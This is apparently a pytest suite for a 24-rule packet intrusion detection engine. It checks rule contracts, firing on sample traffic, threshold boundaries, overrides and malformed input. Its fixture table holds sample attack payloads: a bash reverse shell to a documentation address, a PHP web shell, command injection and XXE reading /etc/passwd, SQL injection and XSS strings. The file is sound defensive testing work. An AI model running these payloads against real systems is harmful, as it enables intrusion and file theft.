"""Section C verification: the 24-rule packet-level IDS registry.

The directive requires the *complete* registry to be proven by automated tests
rather than displayed as a count, and every rule to carry a stable id, category,
version, input requirements, matching logic, severity/weight, evidence,
explanation, MITRE mapping and unit + boundary tests.

Structural guarantee of this file: ``RULE_POSITIVES`` must contain exactly one
entry per registry rule (enforced by
``test_every_registry_rule_has_an_authored_test_case``), so a rule cannot be
added, removed or renamed without a test failing.
"""
from __future__ import annotations

import inspect
import json
import math
import re
from datetime import datetime, timezone
from typing import Any, Callable, Dict, List

import pytest

from app.services.ids import analysis, anomaly_scorer, rules_engine
from app.services.ids.rules_engine import (
    KNOWN_RULE_IDS,
    PACKET_REQUIRED_FIELDS,
    RULE_REGISTRY,
    SEVERITY_RANK,
    run_rules,
)

T0 = 1_700_000_000.0  # fixed epoch base: every test stream is deterministic

# Reserved documentation addresses / domains only (RFC 5737 + example.com), in
# line with the project's "never attack a real target" constraint.
SRC = "192.0.2.10"
DST = "198.51.100.20"
BENIGN_PAYLOAD = "GET /index.html HTTP/1.1  Host: www.example.com"


def pkt(index: int, **overrides: Any) -> Dict[str, Any]:
    """One fully-formed packet record (every declared input present)."""
    packet: Dict[str, Any] = {
        "index": index,
        "timestamp": datetime.fromtimestamp(T0 + index, tz=timezone.utc).isoformat(),
        "unix_ts": T0 + index,
        "protocol": "TCP",
        "src_ip": SRC,
        "dst_ip": DST,
        "src_port": 49152,
        "dst_port": 443,
        "flags": "PSH-ACK",
        "ttl": 64,
        "size": 200,
        "payload_text": BENIGN_PAYLOAD,
        "payload_sample_hex": "",
        "hex": "",
    }
    packet.update(overrides)
    return packet


def series(count: int, step_seconds: float = 1.0, **overrides: Any) -> List[Dict[str, Any]]:
    """``count`` packets ``step_seconds`` apart, with a consistent ISO stamp."""
    out = []
    for i in range(count):
        ts = T0 + i * step_seconds
        out.append(pkt(i, unix_ts=ts,
                       timestamp=datetime.fromtimestamp(ts, tz=timezone.utc).isoformat(),
                       **overrides))
    return out


def signature(text: str) -> List[Dict[str, Any]]:
    return [pkt(0, payload_text=text)]


# ---------------------------------------------------------------------------
# One qualifying stream per rule id. Populated below; the completeness test
# asserts this table is exactly the registry.
# ---------------------------------------------------------------------------
RULE_POSITIVES: Dict[str, Callable[[], List[Dict[str, Any]]]] = {}

_SIGNATURE_POSITIVES: Dict[str, str] = {
    "SIG-SQLI-UNION": "GET /item?id=1' UNION SELECT username,password,NULL FROM users",
    "SIG-SQLI-BLIND": "GET /item?id=1' AND 1=1--",
    "SIG-SQLI-TIME": "GET /item?id=1;WAITFOR DELAY '0:0:5'",
    "SIG-CMDINJ": "GET /render?file=;cat /etc/passwd",
    "SIG-XSS": "GET /q=<script>alert(1)</script>",
    "SIG-XXE": '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>',
    "SIG-LDAP": "GET /search?u=*)(uid=*))(|(uid=*",
    "SIG-REVSHELL": "bash -i >& /dev/tcp/192.0.2.5/4444 0>&1",
    "SIG-WEBSHELL": 'POST /upload form-data filename="shell.php" <?php system($_GET["c"]); ?>',
    "SIG-ENCODED": "GET /r?c=eval(base64_decode('YWJj'))",
    "SIG-SESSIONHIJACK": "GET /account HTTP/1.1  Cookie: sessionid=0a1b2c3d4e5f",
    "SIG-TOKENREPLAY": "GET /api/me HTTP/1.1  Authorization: Bearer eyJhbGciOiJIUzI1NiJ9",
    "SIG-MITM": "TLS record subject=CN=*.example.com issuer=EVIL",
    "SIG-SLOWLORIS": "GET / HTTP/1.1\r\nX-a: 42",
    "SIG-DNSTUNNEL": "DNS query ONSXGEZTQMJ4YHABDEFGHIJKLMN.tunnel.example.com",
}
for _rid, _text in _SIGNATURE_POSITIVES.items():
    RULE_POSITIVES[_rid] = (lambda t=_text: signature(t))

RULE_POSITIVES["THR-CONN-RATE"] = lambda: series(100, step_seconds=0.02, flags="SYN-ACK")
RULE_POSITIVES["THR-PORT-SCAN"] = lambda: [
    pkt(i, dst_port=20000 + i, flags="SYN-ACK") for i in range(12)
]
RULE_POSITIVES["THR-AUTH-FAIL"] = lambda: [
    pkt(i, payload_text='POST /login HTTP/1.1  user="admin" pass="guess" status=401')
    for i in range(5)
]
RULE_POSITIVES["THR-BANDWIDTH"] = lambda: series(3, step_seconds=0.5, size=100000, flags="SYN-ACK")
RULE_POSITIVES["ST-INC-HANDSHAKE"] = lambda: series(5, step_seconds=0.05, flags="SYN")
RULE_POSITIVES["ST-FLAG-ANOMALY"] = lambda: series(3, step_seconds=0.05, flags="NONE")
RULE_POSITIVES["ST-OUT-OF-SEQ"] = lambda: [
    pkt(i, payload_text=f"IP fragment offset={i * 100} MF=1 proto=TCP") for i in range(2)
]
RULE_POSITIVES["ST-LATERAL"] = lambda: [
    pkt(i, dst_port=[22, 445, 3389, 1433][i % 4], unix_ts=T0 + i * 2.0, flags="SYN-ACK")
    for i in range(8)
]
RULE_POSITIVES["ST-BEACON"] = lambda: series(8, step_seconds=10.0, flags="SYN-ACK")

BENIGN_STREAM: List[Dict[str, Any]] = series(6, step_seconds=1.0)


def _hit(result: Dict[str, Any], rule_id: str) -> Dict[str, Any]:
    for t in result["triggered"]:
        if t["rule_id"] == rule_id:
            return t
    raise AssertionError(f"{rule_id} did not fire; triggered={sorted(x['rule_id'] for x in result['triggered'])}")


def _ids(result: Dict[str, Any]) -> List[str]:
    return [t["rule_id"] for t in result["triggered"]]


# ---------------------------------------------------------------------------
# 1. Registry integrity - the advertised count is derived, not claimed.
# ---------------------------------------------------------------------------
def test_registry_holds_exactly_the_papers_24_rules():
    summary = rules_engine.registry_summary()
    assert len(RULE_REGISTRY) == 24 == summary["total"]
    assert summary["layers"] == {"signature": 15, "threshold": 4, "stateful": 5}
    assert sum(summary["layers"].values()) == summary["total"]


def test_registry_counts_are_computed_from_the_registry_itself():
    from collections import Counter

    per_layer = Counter(r["layer"] for r in RULE_REGISTRY)
    assert rules_engine.registry_summary()["layers"]["signature"] == per_layer["signature"]
    assert rules_engine.registry_summary()["total"] == len({r["rule_id"] for r in RULE_REGISTRY})


def test_rule_identifiers_are_stable_and_unique():
    ids = [r["rule_id"] for r in RULE_REGISTRY]
    assert len(ids) == len(set(ids))
    assert set(ids) == KNOWN_RULE_IDS
    for rid in ids:
        assert re.fullmatch(r"(SIG|THR|ST)-[A-Z0-9-]{3,}", rid), rid


def test_no_rule_is_registered_without_an_implemented_matcher():
    unimplemented = [r["rule_id"] for r in RULE_REGISTRY if r["rule_id"] not in rules_engine._MATCHERS]
    assert unimplemented == []


@pytest.mark.parametrize("rule", RULE_REGISTRY, ids=lambda r: r["rule_id"])
def test_every_rule_declares_the_full_contract(rule: Dict[str, Any]):
    assert rule["rule_id"] in KNOWN_RULE_IDS
    assert rule["category"] == rule["layer"]
    assert rule["category"] in rules_engine.LAYER_ORDER
    assert re.fullmatch(r"\d+\.\d+\.\d+", rule["version"]), rule["version"]
    assert rule["severity"] in SEVERITY_RANK
    assert isinstance(rule["weight"], (int, float)) and rule["weight"] > 0
    assert rule["description"] and rule["matching"] and rule["explanation"]
    assert rule["mitre"] and re.fullmatch(r"T\d{4}(\.\d{3})?", rule["mitre"]), rule["mitre"]
    assert isinstance(rule["enabled"], bool)
    if rule["tunable"]:
        assert isinstance(rule["threshold"], dict) and rule["threshold"]
        assert all(isinstance(v, (int, float)) for v in rule["threshold"].values())
    else:
        assert rule["threshold"] is None


@pytest.mark.parametrize("rule", RULE_REGISTRY, ids=lambda r: r["rule_id"])
def test_every_rule_declares_satisfiable_input_requirements(rule: Dict[str, Any]):
    assert rule["inputs"], f"{rule['rule_id']} declares no inputs"
    unsatisfiable = [f for f in rule["inputs"] if f not in PACKET_REQUIRED_FIELDS]
    assert unsatisfiable == [], f"{rule['rule_id']} requires undeclared fields {unsatisfiable}"


def test_signature_patterns_all_compile():
    for rule in RULE_REGISTRY:
        if rule["layer"] == "signature":
            assert re.compile(rule["_pattern"], re.IGNORECASE)


def test_registration_rejects_a_rule_that_breaks_the_contract():
    original = list(rules_engine.RULE_REGISTRY)
    good = dict(original[0])
    try:
        incomplete = {k: v for k, v in good.items() if k != "version"}
        with pytest.raises(RuntimeError, match="missing contract fields"):
            rules_engine._register(incomplete)

        untunable = dict(good)
        untunable["rule_id"] = "THR-TEST-CONTRACT"
        untunable["layer"] = untunable["category"] = "threshold"
        untunable["tunable"] = True
        untunable["threshold"] = None
        with pytest.raises(RuntimeError, match="no threshold config"):
            rules_engine._register(untunable)

        heavy = dict(good)
        heavy["rule_id"] = "ST-TEST-CONTRACT"
        heavy["weight"] = 0
        with pytest.raises(RuntimeError, match="non-positive weight"):
            rules_engine._register(heavy)
    finally:
        rules_engine.RULE_REGISTRY[:] = original
    assert rules_engine.RULE_REGISTRY == original


# ---------------------------------------------------------------------------
# 2. Per-rule behaviour: every rule fires on qualifying traffic, with evidence.
# ---------------------------------------------------------------------------
def test_every_registry_rule_has_an_authored_test_case():
    assert set(RULE_POSITIVES) == set(KNOWN_RULE_IDS), (
        f"missing={sorted(set(KNOWN_RULE_IDS) - set(RULE_POSITIVES))} "
        f"unknown={sorted(set(RULE_POSITIVES) - set(KNOWN_RULE_IDS))}"
    )


@pytest.mark.parametrize("rule_id", sorted(RULE_POSITIVES))
def test_rule_fires_on_qualifying_traffic_with_evidence_and_explanation(rule_id: str):
    packets = RULE_POSITIVES[rule_id]()
    result = run_rules(packets)
    assert result["skipped"] == [], "test stream must use the declared packet schema"
    assert rule_id in _ids(result)

    hit = _hit(result, rule_id)
    spec = rules_engine.rule_spec(rule_id)
    assert hit["category"] == spec["category"]
    assert hit["version"] == spec["version"]
    assert hit["severity"] == spec["severity"]
    assert hit["weight"] == spec["weight"]
    assert hit["mitre"] == spec["mitre"]
    assert hit["inputs_used"] == list(spec["inputs"])
    assert 0.0 < hit["confidence"] <= 1.0
    assert hit["detail"] and hit["explanation"]
    # The explanation must be the rule's declared template rendered with the
    # observed detail, so the UI text is traceable to the rule definition.
    assert hit["explanation"] == spec["explanation"].replace("{detail}", hit["detail"])
    assert hit["matched_packets"], f"{rule_id} fired without evidence references"
    assert hit["evidence"], f"{rule_id} fired without reproducible evidence"

    by_index = {p["index"]: p for p in packets}
    for idx in hit["matched_packets"]:
        assert idx in by_index
    for ref in hit["evidence"]:
        assert ref["type"] == "packet"
        source = by_index[ref["packet_index"]]
        assert ref["src_ip"] == source["src_ip"]
        assert ref["dst_port"] == source["dst_port"]
        assert ref["timestamp"]


@pytest.mark.parametrize("rule_id", sorted(RULE_POSITIVES))
def test_rule_stays_quiet_on_benign_traffic(rule_id: str):
    result = run_rules(BENIGN_STREAM)
    assert rule_id not in _ids(result), f"{rule_id} false-positived on benign traffic"


def test_benign_stream_triggers_no_rule_at_all():
    result = run_rules(BENIGN_STREAM)
    assert result["triggered"] == []
    assert result["rule_score"] == 0.0
    assert len(result["evaluated"]) == 24


def test_all_24_rules_are_evaluated_on_a_real_generated_stream():
    from app.services.ids.packet_generator import generate_packets

    packets = generate_packets("port_scan_syn", packet_count=60, volume="high", seed=7)["packets"]
    result = run_rules(packets)
    assert result["registry_size"] == 24
    assert sorted(result["evaluated"]) == sorted(KNOWN_RULE_IDS)
    assert result["skipped"] == []


# ---------------------------------------------------------------------------
# 3. Boundary conditions for every tunable threshold.
# ---------------------------------------------------------------------------
BOUNDARY_CASES = [
    # (rule_id, fires_at, quiet_just_below, builders)
    ("THR-AUTH-FAIL",
     lambda: [pkt(i, payload_text='POST /login status=401') for i in range(5)],
     lambda: [pkt(i, payload_text='POST /login status=401') for i in range(4)]),
    ("ST-INC-HANDSHAKE",
     lambda: series(5, step_seconds=0.05, flags="SYN"),
     lambda: series(4, step_seconds=0.05, flags="SYN")),
    ("ST-FLAG-ANOMALY",
     lambda: series(3, step_seconds=0.05, flags="NONE"),
     lambda: series(2, step_seconds=0.05, flags="NONE")),
    ("ST-OUT-OF-SEQ",
     lambda: [pkt(i, payload_text=f"IP fragment offset={i} MF=1") for i in range(2)],
     lambda: [pkt(0, payload_text="IP fragment offset=0 MF=1")]),
    ("ST-BEACON",
     lambda: series(6, step_seconds=3.0, flags="SYN-ACK"),
     lambda: series(6, step_seconds=2.9, flags="SYN-ACK")),
    ("THR-BANDWIDTH",
     lambda: series(3, step_seconds=0.5, size=100000, flags="SYN-ACK"),
     lambda: [pkt(0, size=100000, flags="SYN-ACK"), pkt(1, size=99999, flags="SYN-ACK")]),
]


@pytest.mark.parametrize("rule_id,at_limit,below_limit", BOUNDARY_CASES,
                         ids=[c[0] for c in BOUNDARY_CASES])
def test_threshold_boundary_fires_at_and_stops_below_the_limit(rule_id, at_limit, below_limit):
    assert rule_id in _ids(run_rules(at_limit())), "at-limit case must fire"
    assert rule_id not in _ids(run_rules(below_limit())), "just-below case must not fire"


def test_port_scan_boundary_is_counted_over_the_declared_window():
    """12 ports: exactly the limit inside the window, not below it."""
    at = [pkt(i, dst_port=20000 + i, unix_ts=T0 + i * 0.4, flags="SYN-ACK") for i in range(12)]
    below = [pkt(i, dst_port=20000 + i, unix_ts=T0 + i * 0.4, flags="SYN-ACK") for i in range(11)]
    assert "THR-PORT-SCAN" in _ids(run_rules(at))
    assert "THR-PORT-SCAN" not in _ids(run_rules(below))


def test_port_scan_window_seconds_tunable_is_honoured():
    """The window tunable used to be declared but ignored; it now binds."""
    spread = [pkt(i, dst_port=20000 + i, unix_ts=T0 + i * 5.0, flags="SYN-ACK") for i in range(20)]
    assert "THR-PORT-SCAN" not in _ids(run_rules(spread)), "60s apart ports must not be a scan"
    widened = run_rules(spread, overrides={"THR-PORT-SCAN": {"threshold": {"window_seconds": 120}}})
    assert "THR-PORT-SCAN" in _ids(widened), "widening the window must surface the same fan-out"


def test_connection_rate_boundary_respects_headroom_and_min_packets():
    """Same 13 packets; only the arrival spacing crosses the 130/min bar."""
    at = series(13, step_seconds=0.4, flags="SYN-ACK")     # 13 in 4.8s  = 162/min
    below = series(13, step_seconds=0.6, flags="SYN-ACK")  # 13 in 7.2s  = 108/min
    assert "THR-CONN-RATE" in _ids(run_rules(at))
    assert "THR-CONN-RATE" not in _ids(run_rules(below))
    tiny = run_rules(series(7, step_seconds=0.01, flags="SYN-ACK"))
    assert "THR-CONN-RATE" not in _ids(tiny), "below min_packets the rate must not be judged"


def test_lateral_movement_boundary_on_distinct_services():
    at = [pkt(i, dst_port=[22, 445, 3389, 1433][i % 4], unix_ts=T0 + i * 2.0, flags="SYN-ACK")
          for i in range(8)]
    below = [pkt(i, dst_port=[22, 445, 3389][i % 3], unix_ts=T0 + i * 2.0, flags="SYN-ACK")
             for i in range(8)]
    assert "ST-LATERAL" in _ids(run_rules(at))
    assert "ST-LATERAL" not in _ids(run_rules(below))


def test_lateral_movement_uses_the_effective_bandwidth_override():
    """Regression: ST-LATERAL read the *registry default* bandwidth ceiling."""
    sweeping = [pkt(i, dst_port=[22, 445, 3389, 1433][i % 4], unix_ts=T0 + i * 2.0,
                    size=150000, flags="SYN-ACK") for i in range(8)]
    # ~150 kB/s: under the paper default (200000) so sweeping is reported ...
    assert "ST-LATERAL" in _ids(run_rules(sweeping))
    # ... but tightening THR-BANDWIDTH below the observed flow reclassifies it as
    # a volumetric flood, and the override must reach this rule.
    tightened = run_rules(sweeping, overrides={"THR-BANDWIDTH": {"threshold": {"bytes_per_sec": 60000}}})
    assert "ST-LATERAL" not in _ids(tightened)
    assert "THR-BANDWIDTH" in _ids(tightened)


def test_beacon_requires_the_declared_sample_count():
    short = series(5, step_seconds=10.0, flags="SYN-ACK")
    assert "ST-BEACON" not in _ids(run_rules(short))


# ---------------------------------------------------------------------------
# 4. Overrides, enable/disable, unknown rule ids.
# ---------------------------------------------------------------------------
def test_threshold_override_lowers_the_trigger_point():
    packets = [pkt(i, payload_text='POST /login status=401') for i in range(3)]
    assert "THR-AUTH-FAIL" not in _ids(run_rules(packets))
    lowered = run_rules(packets, overrides={"THR-AUTH-FAIL": {"threshold": {"failed_attempts": 3}}})
    assert "THR-AUTH-FAIL" in _ids(lowered)


def test_overrides_do_not_mutate_the_registry():
    before = json.dumps(rules_engine.rule_spec("THR-AUTH-FAIL")["threshold"], sort_keys=True)
    run_rules(BENIGN_STREAM, overrides={"THR-AUTH-FAIL": {"threshold": {"failed_attempts": 1}}})
    after = json.dumps(rules_engine.rule_spec("THR-AUTH-FAIL")["threshold"], sort_keys=True)
    assert before == after


def test_disabling_a_rule_removes_it_from_evaluation():
    packets = RULE_POSITIVES["SIG-XSS"]()
    result = run_rules(packets, enabled={"SIG-XSS": False})
    assert "SIG-XSS" not in result["evaluated"]
    assert "SIG-XSS" not in _ids(result)
    assert len(result["evaluated"]) == 23


def test_override_block_can_disable_a_rule():
    packets = RULE_POSITIVES["THR-AUTH-FAIL"]()
    result = run_rules(packets, overrides={"THR-AUTH-FAIL": {"enabled": False}})
    assert "THR-AUTH-FAIL" not in _ids(result)


def test_unknown_override_rule_ids_are_reported_not_silently_dropped():
    result = run_rules(BENIGN_STREAM, overrides={"SIG-NOT-A-RULE": {"enabled": True}},
                       enabled={"THR-NOT-EITHER": False})
    assert result["unrecognized_overrides"] == ["SIG-NOT-A-RULE", "THR-NOT-EITHER"]
    assert len(result["evaluated"]) == 24


# ---------------------------------------------------------------------------
# 5. Input validation - malformed telemetry must not crash detection.
# ---------------------------------------------------------------------------
MALFORMED_CASES = [
    ("missing:ttl", lambda p: p.pop("ttl")),
    ("missing:payload_text", lambda p: p.pop("payload_text")),
    ("type:src_ip", lambda p: p.update({"src_ip": 12345})),
    ("type:index", lambda p: p.update({"index": "0"})),
    ("non-finite:unix_ts", lambda p: p.update({"unix_ts": float("nan")})),
    ("negative:size", lambda p: p.update({"size": -1})),
    ("out-of-range:dst_port", lambda p: p.update({"dst_port": 70000})),
]


@pytest.mark.parametrize("expected_reason,mutate", MALFORMED_CASES,
                         ids=[c[0] for c in MALFORMED_CASES])
def test_malformed_packet_is_skipped_and_reported(expected_reason, mutate):
    bad = pkt(9, payload_text='GET /q=<script>alert(1)</script>')
    mutate(bad)
    good = pkt(10, payload_text='GET /q=<script>alert(1)</script>')
    result = run_rules([bad, good])
    assert result["skipped"] == [{"position": 0, "index": bad.get("index"), "reason": expected_reason}]
    assert result["accepted_count"] == 1
    assert "SIG-XSS" in _ids(result)
    assert _hit(result, "SIG-XSS")["matched_packets"] == [10]


def test_non_mapping_entries_and_none_input_are_handled():
    assert run_rules([])["triggered"] == []
    empty = run_rules(None)
    assert empty["evaluated"] == [r["rule_id"] for r in RULE_REGISTRY]
    assert empty["triggered"] == []
    assert empty["rule_score"] == 0.0
    result = run_rules(["not-a-packet", 42, None, pkt(0)])
    assert [s["reason"] for s in result["skipped"]] == ["not-a-dict", "not-a-dict", "not-a-dict"]
    assert result["accepted_count"] == 1


def test_out_of_order_timestamps_are_evaluated_without_crashing():
    scrambled = [pkt(i, unix_ts=T0 - i, flags="SYN") for i in range(8)]
    result = run_rules(scrambled)
    assert result["skipped"] == []
    assert "ST-OUT-OF-SEQ" in _ids(result)


def test_duplicate_and_identical_packets_are_counted_deterministically():
    base = pkt(0, payload_text='POST /login status=401')
    duplicated = [dict(base) for _ in range(6)]
    first = _ids(run_rules(duplicated))
    assert "THR-AUTH-FAIL" in first
    assert _ids(run_rules(duplicated)) == first


# ---------------------------------------------------------------------------
# 6. Fusion, determinism and reproducibility from stored evidence.
# ---------------------------------------------------------------------------
def test_rule_score_saturates_between_zero_and_one():
    loud = run_rules(RULE_POSITIVES["THR-CONN-RATE"]())
    assert 0.0 < loud["rule_score"] <= 1.0
    everything = run_rules([
        pkt(i, payload_text=text, flags="SYN", size=100000)
        for i, text in enumerate(_SIGNATURE_POSITIVES.values())
    ])
    assert 0.0 < everything["rule_score"] <= 1.0
    assert everything["rule_score"] >= loud["rule_score"]


def test_run_rules_is_deterministic_for_the_same_stream():
    packets = RULE_POSITIVES["THR-PORT-SCAN"]()
    a = run_rules(packets)
    b = run_rules(packets)
    assert json.dumps(a, sort_keys=True) == json.dumps(b, sort_keys=True)


def test_detections_are_reproducible_from_the_evidence_they_reference():
    """Re-scoring only the matched packets must reproduce the same signature hit."""
    packets = RULE_POSITIVES["SIG-XXE"]()
    hit = _hit(run_rules(packets), "SIG-XXE")
    subset = [p for p in packets if p["index"] in hit["matched_packets"]]
    replayed = _hit(run_rules(subset), "SIG-XXE")
    assert replayed["matched_packets"] == hit["matched_packets"]
    assert replayed["confidence"] == hit["confidence"]
    assert replayed["explanation"] == hit["explanation"]


def test_every_hit_is_json_serialisable_for_the_api():
    packets = RULE_POSITIVES["ST-BEACON"]() + RULE_POSITIVES["SIG-CMDINJ"]()
    for i, p in enumerate(packets):
        p["index"] = i
    result = run_rules(packets)
    assert result["triggered"]
    json.dumps(result)


# ---------------------------------------------------------------------------
# 7. No ground-truth / label leakage into packet detection.
# ---------------------------------------------------------------------------
def test_rules_engine_never_reads_attack_labels_or_catalog_metadata():
    source = inspect.getsource(rules_engine)
    for forbidden in ("attack_id", "attack_catalog", "get_attack", "scenario",
                      "expected_attack", "ground_truth", "detection_status",
                      "ScenarioCategory", "import random"):
        assert forbidden not in source, f"rules engine references {forbidden!r}"


def test_run_rules_signature_accepts_packets_only():
    params = list(inspect.signature(run_rules).parameters)
    assert params == ["packets", "overrides", "enabled"]


def test_detection_result_does_not_depend_on_any_labelled_input():
    """Same packets, different provenance text elsewhere in the record -> same hits."""
    packets = RULE_POSITIVES["SIG-LDAP"]()
    for p in packets:
        p.pop("hex", None)
        p.pop("payload_sample_hex", None)
    assert "SIG-LDAP" in _ids(run_rules(packets))


@pytest.mark.parametrize("module", [rules_engine, anomaly_scorer, analysis],
                         ids=["rules_engine", "anomaly_scorer", "analysis"])
def test_detection_modules_contain_no_live_capture_primitive(module):
    """No live traffic claim is permitted without a tested, authorized source."""
    source = inspect.getsource(module)
    for forbidden in ("import socket", "from scapy", "pcap", "AF_PACKET", "libdnet"):
        assert forbidden not in source


def test_anomaly_scorers_are_declared_as_deterministic_proxies():
    source = inspect.getsource(anomaly_scorer)
    assert "not trained" in anomaly_scorer.MODEL_STATUS
    assert ".fit(" not in source and "RandomForest" not in source
    assert anomaly_scorer.SCORER_NAMES == ("isolation_forest", "autoencoder",
                                           "statistical_zscore", "dbscan_density")
    assert math.isclose(sum(anomaly_scorer.ENSEMBLE_WEIGHTS.values()), 1.0)


# ---------------------------------------------------------------------------
# 8. HTTP surface: the counts the UI renders come from the registry.
# ---------------------------------------------------------------------------
@pytest.fixture(scope="module")
def client():
    from fastapi.testclient import TestClient

    from app.main import app

    return TestClient(app)


def test_rules_endpoint_exposes_the_full_contract(client):
    payload = client.get("/api/ids/rules").json()
    assert len(payload) == len(RULE_REGISTRY) == 24
    for entry in payload:
        for field in ("rule_id", "category", "version", "inputs", "matching",
                      "severity", "weight", "explanation", "mitre", "threshold"):
            assert field in entry, f"{entry['rule_id']} missing {field}"


def test_rules_summary_endpoint_matches_the_registry(client):
    summary = client.get("/api/ids/rules/summary").json()
    assert summary["total"] == 24
    assert summary["layers"] == {"signature": 15, "threshold": 4, "stateful": 5}
    assert summary["ruleset_version"] == rules_engine.RULESET_VERSION


def test_analyze_endpoint_reports_registry_size_and_input_scope(client):
    result = client.post("/api/ids/analyze",
                         json={"attack_id": "sqli_union", "seed": 7, "packet_count": 40}).json()
    assert result["rules"]["registry_size"] == 24
    assert result["rules"]["evaluated_count"] == 24
    assert result["rules"]["registry"]["layers"]["signature"] == 15
    assert result["rules"]["skipped_packets"] == []
    assert result["pipeline"]["live_traffic_capture"] is False
    assert "no authorized live ingestion path" in result["pipeline"]["live_traffic_claim"]
    assert "not trained" in result["ml"]["model_status"]
    assert result["ml"]["feature_count"] == 14
    assert "SIG-SQLI-UNION" in [t["rule_id"] for t in result["rules"]["triggered"]]
    for hit in result["rules"]["triggered"]:
        assert hit["version"] and hit["explanation"] and hit["evidence"]


def test_analyze_endpoint_honours_rule_toggles(client):
    result = client.post("/api/ids/analyze", json={
        "attack_id": "brute_force", "seed": 7, "packet_count": 40,
        "rule_enabled": {"SIG-SQLI-UNION": False, "THR-AUTH-FAIL": False},
    }).json()
    assert "SIG-SQLI-UNION" not in result["rules"]["evaluated"]
    assert "THR-AUTH-FAIL" not in [t["rule_id"] for t in result["rules"]["triggered"]]


def test_partially_formed_packet_is_rejected_with_a_reason():
    result = run_rules([pkt(0), {"index": 1}])
    assert result["skipped"][0]["reason"] == "missing:unix_ts"
    assert result["accepted_count"] == 1
